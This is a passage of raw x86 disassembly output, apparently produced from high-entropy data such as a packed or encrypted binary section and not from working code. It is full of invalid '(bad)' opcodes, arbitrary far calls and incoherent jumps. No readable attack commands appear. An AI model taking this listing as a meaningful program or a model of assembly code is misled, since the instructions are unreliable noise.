  42665a:	ins    BYTE PTR es:[edi],dx
  42665b:	outs   dx,BYTE PTR ds:[esi]
  42665c:	xchg   DWORD PTR [ebp+0x68],ebp
  42665f:	mov    ah,0x88
  426661:	adc    BYTE PTR [esi],bh
  426663:	jne    0x42660a
  426665:	adc    BYTE PTR [ecx],0x68
  426668:	retf   0xbba
  42666b:	pop    edx
  42666c:	ret    
  42666d:	pop    ebx
  42666e:	mov    al,ds:0x568d40
  426673:	imul   ebx,DWORD PTR [edx],0x2474d6ef
  426679:	call   0x9845:0x668682c2
  426680:	sub    al,0x7c
  426682:	fcomp  QWORD PTR [ebp-0x32]
  426685:	mov    ah,0x36
  426687:	push   ss
  426688:	mov    ch,0xf6
  42668a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42668b:	sub    al,0x3a
  42668d:	adc    ah,BYTE PTR [ecx+0x0]
  426690:	or     ebp,DWORD PTR [esi]
  426692:	mov    bl,0x16
  426694:	pop    ebp
  426695:	mov    WORD PTR [edx],es
  426697:	and    al,BYTE PTR [ebp+ebp*8-0x6d]
  42669b:	sbb    dh,BYTE PTR [eax-0x3adb3523]
  4266a1:	mov    esi,0xd89ae6d8
  4266a6:	sub    bh,BYTE PTR [edx]
  4266a8:	ins    BYTE PTR es:[edi],dx
  4266a9:	das    
  4266aa:	xchg   esp,eax
  4266ab:	pop    ds
  4266ac:	cli    
  4266ad:	shl    al,0x6c
  4266b0:	xor    BYTE PTR [ebp+0x3eb204e1],al
  4266b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4266b7:	xchg   esp,eax
  4266b8:	sbb    ch,0x92
  4266bb:	sub    ecx,DWORD PTR [ebx+ebx*2]
  4266be:	jae    0x426650
  4266c0:	lods   al,BYTE PTR ds:[esi]
  4266c1:	mov    cl,0x46
  4266c3:	ins    DWORD PTR es:[edi],dx
  4266c4:	cmp    ebx,DWORD PTR [edx+ebx*4-0x65]
  4266c8:	jmp    DWORD PTR [eax-0x479fc8da]
  4266ce:	push   cs
  4266cf:	mov    cs,WORD PTR ds:0x9541474
  4266d5:	mov    dl,0x24
  4266d7:	push   edi
  4266d8:	xor    BYTE PTR ds:0xcd60e13c,bl
  4266de:	xchg   BYTE PTR [edi],dl
  4266e0:	inc    edx
  4266e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4266e2:	lods   eax,DWORD PTR ds:[esi]
  4266e3:	add    BYTE PTR [ebx-0x38],al
  4266e6:	xchg   ebp,eax
  4266e7:	hlt    
  4266e8:	sbb    esp,edx
  4266ea:	fsub   DWORD PTR [ebp-0x58]
  4266ed:	pop    edx
  4266ee:	test   BYTE PTR [ecx+0x746fa81d],0x62
  4266f5:	or     DWORD PTR [eax],ebp
  4266f7:	sub    DWORD PTR [ebp+0x6e],0x3a3ae8aa
  4266fe:	pop    ds
  4266ff:	add    BYTE PTR [ecx+0x366a554f],cl
  426705:	rol    DWORD PTR ds:0x846e4702,1
  42670b:	mov    dl,0xc
  42670d:	add    BYTE PTR cs:[edx],bl
  426710:	es push esp
  426712:	cdq    
  426713:	das    
  426714:	inc    eax
  426715:	mov    ebx,0x8af916
  42671a:	cmp    DWORD PTR [edi],ebp
  42671c:	pusha  
  42671d:	pop    ebp
  42671e:	adc    ch,BYTE PTR [esi]
  426720:	shl    DWORD PTR [esi-0x6a],1
  426723:	xor    dh,BYTE PTR [eax+0x40]
  426726:	dec    ebx
  426727:	jle    0x426756
  426729:	add    eax,0xa4600be6
  42672e:	sbb    al,0x33
  426730:	cdq    
  426731:	add    BYTE PTR [ecx+0x64],cl
  426734:	shl    BYTE PTR [ecx+0x4368d4d],cl
  42673a:	push   esp
  42673b:	clc    
  42673c:	ss shl bl,1
  42673f:	test   eax,0x1fe6056
  426744:	add    ah,bh
  426746:	fadd   DWORD PTR [eax]
  426748:	push   ebx
  426749:	xor    BYTE PTR [edx-0x4c],al
  42674c:	retf   0xd78
  42674f:	sbb    eax,0xf922d04d
  426754:	cld    
  426755:	jl     0x426790
  426757:	fadd   DWORD PTR [edi+0x7a]
  42675a:	pop    ebx
  42675b:	outs   dx,DWORD PTR ds:[esi]
  42675c:	adc    eax,0xe6ae5505
  426761:	(bad)  
  426762:	sub    esp,eax
  426764:	ret    
  426765:	mov    cs,eax
  426767:	pop    es
  426768:	add    BYTE PTR [edx-0x7e],bh
  42676b:	pop    ebx
  42676c:	xrelease xchg BYTE PTR [esi+eiz*8-0x959ff0e],cl
  426774:	sar    edx,0xcb
  426777:	add    BYTE PTR [edx-0xfa7d76a],al
  42677d:	stos   BYTE PTR es:[edi],al
  42677e:	push   0xffffff84
  426780:	rol    DWORD PTR [bx+si],cl
  426783:	mov    esp,0xb4c69d24
  426788:	in     eax,dx
  426789:	loop   0x42678b
  42678b:	pop    edx
  42678c:	in     al,0x72
  42678e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42678f:	dec    esi
  426790:	enter  0xb128,0xbe
  426794:	mov    DWORD PTR [esi+0x523210e2],esp
  42679a:	int    0xc6
  42679c:	imul   BYTE PTR [edx]
  42679e:	or     ebp,DWORD PTR [edx+0x555cba0a]
  4267a4:	cld    
  4267a5:	push   ecx
  4267a6:	mov    edx,0x4ad4c685
  4267ab:	mov    al,ds:0x7c64f1ca
  4267b0:	push   edx
  4267b1:	pop    edi
  4267b2:	xor    BYTE PTR [edx],ch
  4267b4:	jne    0x426783
  4267b6:	les    eax,FWORD PTR [edi-0x723fd54f]
  4267bc:	inc    esp
  4267bd:	cdq    
  4267be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4267bf:	out    dx,eax
  4267c0:	xchg   DWORD PTR [edx],ecx
  4267c2:	pop    ebx
  4267c3:	popa   
  4267c4:	pop    eax
  4267c5:	jo     0x42681b
  4267c7:	cli    
  4267c8:	pop    esi
  4267c9:	or     cl,BYTE PTR [eax]
  4267cb:	mov    al,0xab
  4267cd:	sub    BYTE PTR [edx],ch
  4267cf:	push   0x315447f4
  4267d4:	add    ch,BYTE PTR [eax-0x1e]
  4267d7:	neg    DWORD PTR [esi+0x77]
  4267da:	loop   0x4267dd
  4267dc:	ins    DWORD PTR es:[edi],dx
  4267dd:	mov    edi,0x683a2b
  4267e2:	jmp    0x4267b2
  4267e4:	mov    ecx,0x50050500
  4267e9:	sbb    BYTE PTR ds:0x34679fba,0xf1
  4267f0:	sub    al,BYTE PTR [edx]
  4267f2:	adc    DWORD PTR [edx],ebp
  4267f4:	fcmove st,st(4)
  4267f6:	inc    esi
  4267f7:	pop    edx
  4267f8:	push   edx
  4267f9:	call   0x551e582e
  4267fe:	push   eax
  4267ff:	sub    BYTE PTR [ebp+0x2f4ef404],0x4c
  426806:	mov    edx,DWORD PTR [esp+edx*4]
  426809:	jmp    0x426875
  42680b:	(bad)  
  42680c:	ss loop 0x426798
  42680f:	adc    BYTE PTR [eax],ch
  426811:	ret    0x410
  426814:	out    dx,eax
  426815:	and    BYTE PTR [eax],bh
  426817:	jbe    0x4267f1
  426819:	sub    BYTE PTR [edi],0x62
  42681c:	inc    edi
  42681d:	push   ss
  42681e:	inc    BYTE PTR [edi-0x6bc688be]
  426824:	sahf   
  426825:	mov    DWORD PTR [esi+0x3afe6a55],esi
  42682b:	jnp    0x42684d
  42682d:	(bad)  
  42682e:	scas   al,BYTE PTR es:[edi]
  42682f:	dec    edx
  426830:	or     edx,eax
  426832:	cmp    ebp,DWORD PTR fs:[edx]
  426835:	ss (bad) 
  426837:	push   esp
  426838:	cmc    
  426839:	or     esi,DWORD PTR [edx-0x579062a2]
  42683f:	pop    eax
  426840:	push   esp
  426841:	xor    ch,bh
  426843:	fld    DWORD PTR ds:[edx+edx*2+0x3c380b]
  42684b:	push   ss
  42684c:	pop    es
  42684d:	or     BYTE PTR [edx+0x2d],dh
  426850:	xor    ah,cl
  426852:	xor    ax,dx
  426855:	shr    BYTE PTR [ecx+eax*4-0x58],1
  426859:	pop    edx
  42685a:	test   eax,0xd0cd182c
  42685f:	loop   0x426877
  426861:	lahf   
  426862:	push   esi
  426863:	rcl    DWORD PTR [eax+0x50],1
  426866:	fcom   DWORD PTR [eax]
  426868:	imul   BYTE PTR [esi]
  42686a:	outs   dx,BYTE PTR ds:[esi]
  42686b:	(bad)  
  42686c:	xchg   esp,eax
  42686d:	(bad)
  426870:	add    BYTE PTR ds:0xa8e64087,0x3b
  426877:	fimul  DWORD PTR [edx+ecx*4+0x5]
  42687b:	mov    ds:0xdc4386ad,al
  426880:	jb     0x4268d0
  426882:	clc    
  426883:	push   esp
  426884:	mov    dl,0xab
  426886:	xor    BYTE PTR [eax],dl
  426888:	add    BYTE PTR [edx+0x6d],dl
  42688b:	mov    esi,0x30001a26
  426890:	push   ebp
  426891:	push   ebp
  426892:	xchg   ecx,eax
  426893:	sub    eax,0xbe631a90
  426898:	xchg   edx,eax
  426899:	addr16 test al,0xa0
  42689c:	sbb    BYTE PTR [ebp+0x6d],cl
  42689f:	inc    ebp
  4268a0:	inc    edi
  4268a1:	push   ecx
  4268a2:	xor    edx,DWORD PTR ss:[eax]
  4268a5:	cmp    eax,0x823d2213
  4268aa:	sbb    al,0xcd
  4268ac:	out    dx,eax
  4268ad:	ficomp DWORD PTR [esp+esi*4]
  4268b0:	jl     0x4268c5
  4268b2:	xchg   BYTE PTR [eax-0x7ae8ff8d],bl
  4268b8:	add    BYTE PTR [eax],bh
  4268ba:	nop
  4268bb:	popa   
  4268bc:	inc    edx
  4268bd:	push   ebx
  4268be:	mov    edx,DWORD PTR [edx]
  4268c0:	mov    bl,0x19
  4268c2:	mov    al,ds:0x50692fd
  4268c7:	and    BYTE PTR [eax+0x10],bl
  4268ca:	add    DWORD PTR [eax-0x52],esp
  4268cd:	push   es
  4268ce:	xchg   edx,eax
  4268cf:	push   cs
  4268d0:	inc    ebp
  4268d1:	aad    0x86
  4268d3:	sbb    BYTE PTR [esi+0x26a8497a],al
  4268d9:	sub    BYTE PTR [esi-0x4bf2bd4c],0xb
  4268e0:	(bad)  
  4268e1:	rol    al,1
  4268e3:	out    dx,al
  4268e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4268e5:	imul   ebx,DWORD PTR [esi-0x2929fa60],0xdae49a9a
  4268ef:	js     0x426911
  4268f1:	nop
  4268f2:	and    eax,0x3c3a3628
  4268f7:	sub    eax,0x6c5afb80
  4268fc:	mov    bl,0x76
  4268fe:	push   esp
  4268ff:	int3   
  426900:	mov    dl,0xe
  426902:	mov    ds:0xb27003c4,eax
  426907:	das    
  426908:	mov    al,0xbe
  42690a:	in     eax,0x58
  42690c:	rcl    ebp,1
  42690e:	xchg   esp,eax
  42690f:	iret   
  426910:	outs   dx,BYTE PTR ds:[esi]
  426911:	paddusb mm6,QWORD PTR ds:0x2051b497
  426918:	mov    al,ds:0x568caad4
  42691d:	fcomp  DWORD PTR [edx]
  42691f:	or     BYTE PTR [edx+ebp*4+0x34a3d2d6],cl
  426926:	pop    eax
  426927:	mov    dh,BYTE PTR [ecx+0x8]
  42692a:	adc    DWORD PTR [ecx-0x42],esp
  42692d:	jne    0x426995
  42692f:	or     BYTE PTR [esi-0x66ff4d69],0x51
  426936:	clc    
  426937:	push   ss
  426938:	test   al,0x89
  42693a:	add    dl,BYTE PTR [eax+0x1fe45e21]
  426940:	aas    
  426941:	lock sub al,0xfc
  426944:	adc    al,0xfe
  426946:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426947:	sbb    DWORD PTR [esi],ebx
  426949:	sti    
  42694a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42694b:	or     al,BYTE PTR [ecx+0x5b]
  42694e:	add    BYTE PTR [ebx+0x3e],bh
  426951:	sbb    dh,0x78
  426954:	jo     0x4269be
  426956:	adc    dh,dl
  426958:	and    al,0x6b
  42695a:	int    0x12
  42695c:	sub    BYTE PTR [ebp-0x78],al
  42695f:	fsubr  QWORD PTR [esp+eax*8-0x17121110]
  426966:	stos   BYTE PTR es:[edi],al
  426967:	mov    al,0xf
  426969:	pop    esi
  42696a:	and    cl,BYTE PTR [eax+0x799c8d4a]
  426970:	aaa    
  426971:	(bad)
  426975:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426976:	cmp    BYTE PTR [eax],dl
  426978:	neg    bh
  42697a:	les    edi,FWORD PTR [edi]
  42697c:	rol    DWORD PTR [esi],0xf3
  42697f:	outs   dx,DWORD PTR ds:[esi]
  426980:	push   edx
  426981:	dec    ebp
  426982:	dec    eax
  426983:	add    BYTE PTR [ebx-0x5822ffc8],bh
  426989:	stos   BYTE PTR es:[edi],al
  42698a:	add    al,0xc
  42698c:	sbb    BYTE PTR [ebx+0x7a06d47a],al
  426992:	outs   dx,DWORD PTR ds:[esi]
  426993:	xchg   ebp,eax
  426994:	and    al,0xb
  426996:	or     ebx,DWORD PTR fs:[edx+0x33]
  42699a:	push   ss
  42699b:	loop   0x42697f
  42699d:	(bad)  
  42699e:	loop   0x4269a0
  4269a0:	mov    cl,0x4c
  4269a2:	push   ss
  4269a3:	pop    edx
  4269a4:	or     BYTE PTR [esi],0x5b
  4269a7:	push   eax
  4269a8:	call   0x1cccb5ce
  4269ad:	sub    dh,al
  4269af:	mov    bh,0x55
  4269b1:	push   ecx
  4269b2:	push   eax
  4269b3:	and    al,0x8c
  4269b5:	je     0x426a11
  4269b7:	rcl    BYTE PTR [ebx],cl
  4269b9:	sbb    al,0x56
  4269bb:	or     bl,BYTE PTR [edx-0x2fe357a3]
  4269c1:	mov    esi,0xf0513aca
  4269c6:	inc    edi
  4269c7:	ins    DWORD PTR es:[edi],dx
  4269c8:	in     eax,dx
  4269c9:	nop
  4269ca:	fsub   DWORD PTR [eax+0x49162a92]
  4269d0:	cmp    dh,BYTE PTR [edx]
  4269d2:	mov    eax,cs:0x699b104d
  4269d8:	jae    0x426984
  4269da:	call   0xfaa674b3
  4269df:	mov    ch,0xd4
  4269e1:	push   ecx
  4269e2:	push   eax
  4269e3:	mov    cl,0xe0
  4269e5:	cmp    BYTE PTR [ebx],dl
  4269e7:	pusha  
  4269e8:	fs push edx
  4269ea:	cs in  al,dx
  4269ec:	pop    edx
  4269ed:	ins    BYTE PTR es:[edi],dx
  4269ee:	xor    al,0x3a
  4269f0:	add    al,0x8f
  4269f2:	sub    BYTE PTR [edi+0x34],bh
  4269f5:	adc    ch,BYTE PTR [ebx+eiz*1+0x26]
  4269f9:	and    eax,0x30b2a051
  4269fe:	dec    edi
  4269ff:	mov    WORD PTR [eax-0x717e76ec],cs
  426a05:	test   DWORD PTR [eax-0x7],ecx
  426a08:	repnz or BYTE PTR [esi+esi*2],al
  426a0c:	xor    al,0x14
  426a0e:	je     0x426a00
  426a10:	cmc    
  426a11:	mov    ds:0x3c615091,al
  426a16:	out    dx,al
  426a17:	mov    ch,0x92
  426a19:	test   BYTE PTR [ebp+0x50d0f216],bh
  426a1f:	bound  eax,QWORD PTR cs:[ebx+0x43]
  426a23:	xchg   ebx,eax
  426a24:	adc    al,0xa0
  426a26:	lds    ebx,FWORD PTR [ebp+edx*1+0x7a]
  426a2a:	nop
  426a2b:	fst    DWORD PTR [esi-0x4c]
  426a2e:	xchg   BYTE PTR [ebx],al
  426a30:	jb     0x426a80
  426a32:	adc    al,0x78
  426a34:	fdiv   QWORD PTR [eax-0x12]
  426a37:	push   esp
  426a38:	xlat   BYTE PTR ds:[ebx]
  426a39:	mov    al,ds:0xfac0a2b6
  426a3e:	xor    BYTE PTR [ecx-0x29d1911e],bl
  426a44:	(bad)  [edx-0x2b0bd8f2]
  426a4a:	xor    al,0xf8
  426a4c:	js     0x4269ed
  426a4e:	loopne 0x426a17
  426a50:	mov    ah,BYTE PTR [edx+0x65e2e38a]
  426a56:	push   esi
  426a57:	addr16 adc bh,dl
  426a5a:	jb     0x426a74
  426a5c:	adc    eax,0x1a460705
  426a61:	mov    WORD PTR [ecx-0x650b89a0],es
  426a67:	mov    dl,0x55
  426a69:	push   ebp
  426a6a:	sbb    eax,0x899c5148
  426a6f:	xor    bl,al
  426a71:	call   0x4668:0xeb501488
  426a78:	inc    ebp
  426a79:	dec    esi
  426a7a:	adc    bh,BYTE PTR [edx]
  426a7c:	jns    0x426ada
  426a7e:	mov    ds:0xf28a8ad0,eax
  426a83:	push   ds
  426a84:	loopne 0x426a45
  426a86:	cmp    ah,0x70
  426a89:	xor    al,0x56
  426a8b:	adc    eax,0x66108834
  426a90:	mov    dl,0xa2
  426a92:	pusha  
  426a93:	out    dx,al
  426a94:	mov    eax,ds:0xfaab62
  426a99:	jmp    0xbb893cb6
  426a9e:	pop    ecx
  426a9f:	jo     0x426a41
  426aa1:	fmul   DWORD PTR [edi]
  426aa3:	pusha  
  426aa4:	xchg   ecx,eax
  426aa5:	inc    esp
  426aa6:	and    BYTE PTR [esp+eax*4-0x3e],cl
  426aaa:	xlat   BYTE PTR ds:[ebx]
  426aab:	loop   0x426b23
  426aad:	retf   0x1576
  426ab0:	xor    al,0x62
  426ab2:	lock push ds
  426ab4:	inc    esi
  426ab5:	clc    
  426ab6:	jmp    0xa3a2:0xadb47674
  426abd:	adc    dl,BYTE PTR [edx+esi*2-0x2f6cddcf]
  426ac4:	push   0xffffffdd
  426ac6:	cs into 
  426ac8:	sub    al,0x28
  426aca:	sub    BYTE PTR [eax+0x58],dl
  426acd:	(bad)  
  426ace:	or     BYTE PTR [eax+0x1],bh
  426ad1:	lock xchg BYTE PTR [edi+0x49],cl
  426ad5:	test   eax,0xdbf455a3
  426ada:	jl     0x426a5f
  426adc:	js     0x426a7b
  426ade:	int3   
  426adf:	out    0xbf,al
  426ae1:	ror    DWORD PTR [esi],0x8c
  426ae4:	cmp    al,0x0
  426ae6:	adc    ebx,0xc9c700
  426aec:	lods   al,BYTE PTR ds:[esi]
  426aed:	xor    ah,BYTE PTR [edi-0x53]
  426af0:	sub    DWORD PTR [ebx+edx*1],esp
  426af3:	sbb    ah,BYTE PTR [edx+eiz*1-0x10]
  426af7:	mov    fs,eax
  426af9:	call   0x2275:0x98454dae
  426b00:	pushf  
  426b01:	or     DWORD PTR [edx+0x2e],0x75147698
  426b08:	test   al,0xcc
  426b0a:	ins    BYTE PTR es:[edi],dx
  426b0b:	jp     0x426b1b
  426b0d:	adc    DWORD PTR [esi-0x67c9bc93],ebp
  426b13:	push   ss
  426b14:	sbb    DWORD PTR [esi+0x1c1e2702],eax
  426b1a:	mov    esp,0x24f825d3
  426b1f:	(bad)  
  426b21:	jbe    0x426ba0
  426b23:	outs   dx,BYTE PTR ds:[esi]
  426b24:	xchg   DWORD PTR [eax],eax
  426b26:	icebp  
  426b27:	xchg   edx,eax
  426b28:	jbe    0x426b3b
  426b2a:	ins    BYTE PTR es:[edi],dx
  426b2b:	xchg   ebx,eax
  426b2c:	mov    al,ds:0x6689260a
  426b31:	mov    eax,0x1bacfc88
  426b36:	ror    BYTE PTR [edx-0x411ebf2a],0x3e
  426b3d:	sub    BYTE PTR [edx-0x2a],al
  426b40:	ins    DWORD PTR es:[edi],dx
  426b41:	lods   eax,DWORD PTR ds:[esi]
  426b42:	rcr    BYTE PTR [esi-0xe],0x8a
  426b46:	daa    
  426b47:	sub    ah,BYTE PTR cs:[ecx]
  426b4a:	push   ss
  426b4b:	xchg   edi,eax
  426b4c:	mov    ch,al
  426b4e:	jno    0x426b3a
  426b50:	call   0x8f1c7bff
  426b55:	sbb    edi,DWORD PTR [eax]
  426b57:	imul   edx,DWORD PTR [esi+0x2d30ad7d],0x927ec0aa
  426b61:	cmp    cl,BYTE PTR [eax]
  426b63:	es push edx
  426b65:	push   ebp
  426b66:	out    dx,al
  426b67:	loop   0x426af0
  426b69:	ret    0x6c63
  426b6c:	add    al,0x18
  426b6e:	outs   dx,BYTE PTR ds:[esi]
  426b6f:	clc    
  426b70:	push   esi
  426b71:	add    BYTE PTR [edi+0x64],bl
  426b74:	ins    BYTE PTR es:[edi],dx
  426b75:	push   esi
  426b76:	mov    al,0x1c
  426b78:	js     0x426b97
  426b7a:	int3   
  426b7b:	jl     0x426bbd
  426b7d:	mov    al,ds:0x4345d98d
  426b82:	pop    ebx
  426b83:	lock in al,0x1d
  426b86:	dec    esi
  426b87:	adc    BYTE PTR [esp+eax*8-0x1],cl
  426b8b:	enter  0x94c4,0x81
  426b8f:	jns    0x426b58
  426b91:	push   es
  426b92:	sub    al,0xff
  426b94:	(bad)  
  426b96:	sub    al,0x0
  426b98:	cld    
  426b99:	stc    
  426b9a:	sub    ch,BYTE PTR [eax+eiz*2-0x3308bebb]
  426ba1:	ins    BYTE PTR es:[edi],dx
  426ba2:	push   0xffffffaa
  426ba4:	adc    eax,0x1b0ab3f6
  426ba9:	call   0xfe5e:0x58600ade
  426bb0:	mov    esp,0x57226b00
  426bb5:	loopne 0x426c1c
  426bb7:	add    eax,0xd76cd158
  426bbc:	add    dh,bl
  426bbe:	in     al,dx
  426bbf:	test   ecx,ebp
  426bc1:	call   0xb3a0f33c
  426bc6:	out    dx,eax
  426bc7:	adc    eax,0x3401e8ad
  426bcc:	jecxz  0x426c0c
  426bce:	fistp  QWORD PTR [esi+0x6822c4d0]
  426bd4:	dec    ebp
  426bd5:	mov    dh,0x0
  426bd7:	xchg   esp,eax
  426bd8:	sub    DWORD PTR [esi+ebx*2-0x1e],eax
  426bdc:	mov    ds:0x415aad4c,al
  426be1:	sbb    DWORD PTR [eax-0x5789e1a6],0xab35d6b9
  426beb:	xor    eax,0x176c0351
  426bf0:	sahf   
  426bf1:	call   0x5f9a:0xa35d3a96
  426bf8:	mov    ah,0xaa
  426bfa:	or     eax,0x745ceb
  426bff:	jae    0x426c07
  426c01:	add    bl,ch
  426c03:	push   esp
  426c04:	or     al,0xa2
  426c06:	mov    al,ds:0xab240ed9
  426c0b:	ret    
  426c0c:	dec    esp
  426c0d:	inc    esi
  426c0e:	clc    
  426c0f:	adc    dh,ah
  426c11:	mov    eax,ds:0x4ca1a2ad
  426c16:	std    
  426c17:	dec    BYTE PTR [edi-0x20d7ebf0]
  426c1d:	in     al,0xfc
  426c1f:	or     ecx,DWORD PTR [edx]
  426c21:	mov    ss,WORD PTR [eax]
  426c23:	sbb    DWORD PTR [edx],edx
  426c25:	loopne 0x426c17
  426c27:	pop    ecx
  426c28:	loope  0x426c2a
  426c2a:	pusha  
  426c2b:	inc    esp
  426c2c:	add    cl,bl
  426c2e:	push   eax
  426c2f:	push   ebp
  426c30:	push   ebp
  426c31:	mov    dh,0xc0
  426c33:	dec    eax
  426c34:	mov    ebx,0x204e9a73
  426c39:	cmp    al,0x87
  426c3b:	push   esi
  426c3c:	icebp  
  426c3d:	mov    es,WORD PTR ds:0xea9bac96
  426c43:	lahf   
  426c44:	add    BYTE PTR [eax+0x5842406b],dh
  426c4a:	inc    ecx
  426c4b:	ficom  DWORD PTR [edx+0x5]
  426c4e:	ficom  WORD PTR [edi+0x1b]
  426c51:	cmp    al,0xa4
  426c53:	sahf   
  426c54:	mov    al,0xc1
  426c56:	icebp  
  426c57:	mov    esp,0x80722273
  426c5c:	das    
  426c5d:	out    0xe,al
  426c5f:	jg     0x426cb7
  426c61:	fs fwait
  426c63:	sbb    bh,dh
  426c65:	jo     0x426ca7
  426c67:	adc    ah,bl
  426c69:	call   0x6a1d:0xf4346e
  426c70:	mov    ch,0xe6
  426c72:	inc    esi
  426c73:	loop   0x426c4b
  426c75:	pusha  
  426c76:	cmp    edx,esp
  426c78:	shl    DWORD PTR [eax-0x42],1
  426c7b:	push   0x4b
  426c7d:	add    al,BYTE PTR [eax]
  426c7f:	mov    eax,ds:0xa81c3296
  426c84:	mov    DWORD PTR [edx+0x6251d868],ebx
  426c8a:	mov    cl,0x84
  426c8c:	int    0x94
  426c8e:	loopne 0x426ccb
  426c90:	lods   eax,DWORD PTR ds:[esi]
  426c91:	loope  0x426ce3
  426c93:	xor    BYTE PTR [eax],dh
  426c95:	out    0xaa,al
  426c97:	fimul  DWORD PTR [ecx+0x64]
  426c9a:	in     eax,0x70
  426c9c:	add    eax,0xf2805d6d
  426ca1:	xor    al,0x26
  426ca3:	popa   
  426ca4:	sbb    al,0x28
  426ca6:	mov    dh,0x86
  426ca8:	add    bl,bl
  426caa:	loopne 0x426cfc
  426cac:	jo     0x426cb2
  426cae:	add    BYTE PTR [eax-0x78ff6e6],al
  426cb4:	ja     0x426c77
  426cb6:	mov    ch,0x16
  426cb8:	cmp    DWORD PTR [eax-0x8],ecx
  426cbb:	and    bh,0x46
  426cbe:	retf   
  426cbf:	pushf  
  426cc0:	xor    eax,0xff6bd0db
  426cc5:	dec    esp
  426cc6:	iret   
  426cc7:	cmp    eax,0x70fa122c
  426ccc:	and    bl,bl
  426cce:	sub    BYTE PTR [eax+0xa],dl
  426cd1:	lods   eax,DWORD PTR ds:[esi]
  426cd2:	sbb    al,0xe2
  426cd4:	mov    BYTE PTR [esi],al
  426cd6:	cld    
  426cd7:	nop
  426cd8:	rcl    BYTE PTR [edx+0x15],cl
  426cdb:	in     al,dx
  426cdc:	sub    dl,dl
  426cde:	cmc    
  426cdf:	shl    DWORD PTR es:[eax],1
  426ce2:	data16 (bad) 
  426ce4:	xor    BYTE PTR [eax],dh
  426ce6:	inc    eax
  426ce7:	jmp    0x426cd1
  426ce9:	xchg   BYTE PTR [esi],bl
  426ceb:	jb     0x426cf4
  426ced:	inc    eax
  426cee:	dec    esp
  426cef:	cmp    cl,BYTE PTR [edx-0x75d8f97a]
  426cf5:	loopne 0x426d04
  426cf7:	enter  0x5888,0x61
  426cfb:	cmp    DWORD PTR [ecx-0x3f],0xde90ccfa
  426d02:	add    BYTE PTR [esi+0x5],ah
  426d05:	mov    edx,0xd15466b6
  426d0a:	pop    edx
  426d0b:	sub    DWORD PTR [edx+edx*1],0x469d0ad9
  426d12:	mov    eax,0x5e685da6
  426d17:	gs fcmove st,st(2)
  426d1a:	addr16 jg 0x426d93
  426d1d:	and    al,0xab
  426d1f:	pop    es
  426d20:	add    al,dh
  426d22:	std    
  426d23:	push   ebx
  426d24:	xchg   ebp,eax
  426d25:	mov    al,ds:0x905e7a0a
  426d2a:	jb     0x426d49
  426d2c:	pop    esi
  426d2d:	ss adc al,0x15
  426d30:	fdiv   DWORD PTR [edx]
  426d32:	retf   0xd5b4
  426d35:	push   cs
  426d36:	xor    bh,BYTE PTR [edx-0x73]
  426d39:	dec    edx
  426d3a:	and    al,0x86
  426d3c:	cmp    BYTE PTR ss:[esp+ebp*1],cl
  426d40:	inc    edx
  426d41:	jne    0x426ce1
  426d43:	xchg   ecx,eax
  426d44:	push   0x33
  426d46:	xor    edx,DWORD PTR [esi-0x1cad8f54]
  426d4c:	pusha  
  426d4d:	push   eax
  426d4e:	push   0x50
  426d50:	xchg   edi,eax
  426d51:	push   0xfffffffb
  426d53:	and    ebp,DWORD PTR [eax+0x5c6ec3e0]
  426d59:	inc    ebx
  426d5a:	add    edx,eax
  426d5c:	and    al,0x68
  426d5e:	pop    esi
  426d5f:	neg    BYTE PTR [esi-0x30]
  426d62:	repnz adc eax,0x345ba6d9
  426d68:	call   0xe8e66d98
  426d6d:	mov    ecx,0xefe652af
  426d72:	dec    ebp
  426d73:	and    eax,0xb4dc3515
  426d78:	je     0x426cfb
  426d7a:	call   0x1fe0:0x67bd
  426d80:	mov    DWORD PTR [edi+0x54],edx
  426d83:	sbb    eax,0x105e00fe
  426d88:	hlt    
  426d89:	mov    DWORD PTR ss:[edx+0x31f09aaa],0xa26fb7d8
  426d94:	mov    esi,0xa8441b45
  426d99:	or     DWORD PTR [ecx],eax
  426d9b:	sbb    al,0xe8
  426d9d:	or     ch,0x16
  426da0:	inc    eax
  426da1:	dec    edx
  426da2:	push   0xffffff8b
  426da4:	int    0x64
  426da6:	mov    ss,WORD PTR [esp+eiz*2-0x5f]
  426daa:	enter  0x5054,0x64
  426dae:	test   dh,0xad
  426db1:	mov    BYTE PTR [esi+0x5542b443],dh
  426db7:	mov    ch,0x92
  426db9:	pop    eax
  426dba:	mov    ?,esi
  426dbc:	xor    edx,edx
  426dbe:	hlt    
  426dbf:	aad    0xe0
  426dc1:	push   edx
  426dc2:	jae    0x426e30
  426dc4:	push   esi
  426dc5:	mov    dh,0x32
  426dc7:	push   ss
  426dc8:	hlt    
  426dc9:	dec    ecx
  426dca:	or     DWORD PTR [esi],ebx
  426dcc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426dcd:	cmp    eax,DWORD PTR [ebx-0x7d]
  426dd0:	add    BYTE PTR ds:0x3ea636fc,al
  426dd6:	add    dl,ah
  426dd8:	bound  eax,QWORD PTR [ebp+0x51]
  426ddb:	inc    ebp
  426ddc:	dec    edi
  426ddd:	cmp    bl,BYTE PTR [ecx]
  426ddf:	adc    dl,0x4
  426de2:	retf   
  426de3:	cdq    
  426de4:	mov    DWORD PTR fs:[esp+eax*4],ebx
  426de8:	push   edx
  426de9:	mov    dh,dl
  426deb:	push   ecx
  426dec:	rcl    cl,1
  426dee:	call   0x50a8:0x6216aba2
  426df5:	(bad)  
  426df6:	xor    eax,0xb334d6b5
  426dfb:	push   0x2e
  426dfd:	or     ebp,DWORD PTR [ecx+0x480ae628]
  426e03:	xchg   ebp,eax
  426e04:	mov    ah,0xc1
  426e06:	and    BYTE PTR [edx],al
  426e08:	into   
  426e09:	cdq    
  426e0a:	pop    ss
  426e0b:	push   ds
  426e0c:	popa   
  426e0d:	sub    ecx,DWORD PTR [edx+0x1c0b28ec]
  426e13:	push   0x56f2ac37
  426e18:	dec    esp
  426e19:	jbe    0x426e2f
  426e1b:	mov    ch,0xd8
  426e1d:	ficomp WORD PTR [ebx-0x1]
  426e20:	mov    edi,0xc034a3f
  426e25:	scas   al,BYTE PTR es:[edi]
